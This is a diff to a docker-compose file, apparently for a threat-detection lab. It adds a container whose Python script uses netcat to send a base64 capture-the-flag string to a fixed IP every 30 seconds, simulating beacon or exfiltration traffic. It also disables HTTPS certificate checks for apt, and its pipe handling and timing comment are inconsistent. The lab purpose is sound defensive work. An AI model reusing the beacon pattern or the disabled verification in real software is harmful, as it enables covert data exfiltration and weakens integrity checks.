@@ -254,7 +254,57 @@ services:
           dig beacon.cloudsecurity.ninja
           sleep 10
         done
-      
+
+  carepackage_client:
+    #https://github.com/therealnoof/findthesheep/blob/main/carePackage.py
+    container_name: carepackage_client
+    image: ubuntu:22.04
+    restart: unless-stopped
+    dns: 192.168.100.8
+    networks: 
+      clientnet:
+        ipv4_address: 192.168.80.80  
+    command:
+    - /bin/bash
+    - -c 
+    - |
+        ## update and install required binaries
+        apt -o "Acquire::https::Verify-Peer=false" update
+        apt -o "Acquire::https::Verify-Peer=false" install -y iproute2 curl iputils-ping net-tools python3 python3-requests  
+
+        ## create carePackage.py
+        cat > "/carePackage.py" << 'EOF'
+        #!/usr/bin/env python3
+        import subprocess
+        import time
+
+        # Define the remote IP address, port, and payload
+        REMOTE_IP = '192.168.100.20'  # Replace with the actual IP address (current IP maps to httpbin.org
+        PORT = 443
+        PAYLOAD = "Q1RGLUhheDByIQ=="
+
+        # Function to establish a network connection using nc (netcat)
+        def establish_network_connection(ip, port, payload):
+            try:
+                # Use netcat to connect to the remote IP and port, and send the payload
+                subprocess.run(['echo', payload] + ['|'] + ['nc', ip, str(port)], shell=True, check=True)
+                print(f"Payload sent successfully to {ip}:{port}")
+            except subprocess.CalledProcessError as e:
+                print(f"Failed to send payload to {ip}:{port}. Error: {e}")
+
+        # Main function to establish connection and loop every 10 minutes
+        def main():
+            while True:
+                establish_network_connection(REMOTE_IP, PORT, PAYLOAD)
+                time.sleep(30)  # Sleep for 30 seconds
+
+        if __name__ == "__main__":
+            main()
+        EOF
+
+        ## start carePackage
+        python3 /carePackage.py
+
 
 networks:
   clientnet:
